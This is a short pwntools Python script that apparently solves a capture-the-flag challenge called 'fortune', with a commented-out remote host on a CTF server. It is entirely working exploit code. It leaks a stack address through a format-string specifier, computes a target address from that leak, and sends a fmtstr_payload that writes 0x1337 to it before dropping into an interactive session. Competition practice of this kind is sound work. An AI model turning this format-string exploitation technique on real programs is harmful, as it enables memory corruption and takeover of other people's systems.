from pwn import *

def start(argv=[], *a, **kw):
        if args.GDB: # Set GDBscript
                return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
        elif args.REMOTE: # ('server', 'port')
                return remote(sys.argv[1], sys.argv[2], *a, **kw)
        else: # run locally
                return process([exe] + argv, *a, **kw)

gdbscript = '''
break *receive_blessing+33
continue
'''.format(**locals())

exe = "./fortune"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "debug"

io = start()
# io = remote("fortune-teller-122ad9794a4d.inst15.ctf.fortid.com", 1337, ssl=True)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
payload = flat([
	"AAAAAAAA",
	#"|%10$p", #Remote
	"|%34$p" #Local
])
io.sendline("1")
io.sendline(payload)

offsetAddr = 740
io.recvuntil("|")
leak = io.recvuntil("\n")
leak = leak[0:len(leak)-1]

targetAddr = int(leak, 16) + offsetAddr

print("targetAddr: " + str(targetAddr))

offset = 6
value = 0x1337
payload = fmtstr_payload(offset=offset, writes={targetAddr: value})
io.sendline("1")
io.sendline(payload)
io.sendline("2")
io.interactive()
